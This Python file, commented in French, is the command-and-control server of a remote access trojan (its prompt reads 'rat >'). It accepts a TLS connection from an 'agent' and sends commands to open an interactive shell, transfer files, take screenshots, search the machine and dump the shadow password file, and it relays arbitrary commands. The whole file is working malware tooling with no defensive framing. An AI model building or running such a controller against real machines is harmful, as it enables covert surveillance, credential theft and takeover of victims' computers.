import socket
import ssl
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

# Fonction permettant de récupérer la liste des commandes disponibles
def menu_help(client_socket) :
    client_socket.send(b'menu_help') # Envoie de la commande

# Fonction permettant de télécharger un fichier du client
def download(client_socket) :
    client_socket.send(b'download') # Envoie de la commande

# Fonction permettant de charger un fichier au client
def upload(client_socket) :
    client_socket.send(b'upload') # Envoie de la commande

# Fonction permettant d'initier un shell intéractif sur le client
def shell(client_socket) :
    client_socket.send(b'shell') # Envoie de la commande

# Fonction permettant de récupérer la configuration réseau du client
def ipconfig(client_socket) :
    client_socket.send(b'ipconfig') # Envoie de la commande

# Fonction permettant de récupérer la capture d'écran du client
def screenshot(client_socket, nb_screenshot) :
    client_socket.send(b'screenshot') # Envoie de la commande
    screenshot_name = f'screenshot{nb_screenshot}.png'
    with open(screenshot_name, 'wb') as screenshot: # Ouverture du fichier créé
        while True:
            screenshot_received = client_socket.recv(4096) # Récupération des données de la capture d'écran
            if screenshot_received.endswith(b'END'): # Vérification du délimiteur  final
                screenshot.write(screenshot_received[:-3]) # Ecriture des données reçue dans le fichier ouvert sans le délimiteur
                break
            screenshot.write(screenshot_received) # Ecriture des données reçue dans le fichier ouvert
    print(f'[+] {screenshot_name} reçu')
    return nb_screenshot + 1 # Incrémentation du nombre de capture d'écran

# Fonction permettant de chercher un fichier sur la machine du client
def search(client_socket) :
    client_socket.send(b'search') # Envoie de la commande

# Fonction permettant de récupérer le fichier shadow du client
def hashdump(client_socket) :
    client_socket.send(b'hashdump') # Envoie de la commande



def main() :

    # Récupération et définition des variables
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')
    nb_screenshot = 1
    cert = './cert.pem'
    key = './key.pem'

    # Création du contexte SSL pour l'authentification client
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=cert, keyfile=key)

    # Création du socket TCP pour la connexion au serveur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_server, SERVER_PORT)) # Définition de l'adresse et du port d'écoute du serveur
    server_socket.listen(1) # Mise en écoute du socket

    print(f"[*] Listening on {SERVER_PORT}...")

    # Enveloppement du socket avec SSL pour sécuriser la communication
    with context.wrap_socket(server_socket, server_side=True) as ssl_socket:

        # Attente d'une connexion entrante et acceptation de celle-ci
        client_socket, client_address = ssl_socket.accept()
        print("[+] Agent received !")

        # Gestion des commandes envoyées au client
        while True:
            command = input("rat > Taper votre commande ici : ")
            if command.lower() == 'help':
                menu_help(client_socket)
            elif command.lower() == 'download':
                download(client_socket)
            elif command.lower() == 'upload':
                upload(client_socket)
            elif command.lower() == 'shell':
                shell(client_socket)
            elif command.lower() == 'ipconfig':
                ipconfig(client_socket)
            elif command.lower() == 'screenshot':
                nb_screenshot = screenshot(client_socket, nb_screenshot)
            elif command.lower() == 'search':
                search(client_socket)
            elif command.lower() == 'hashdump':
                hashdump(client_socket)
            elif command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            else:
                client_socket.send(command.encode())
                result = client_socket.recv(1024).decode()
                print(result)

        client_socket.close() # Fermeture du socket client
    server_socket.close() # Fermeture du socket serveur


if __name__ == "__main__":
    main()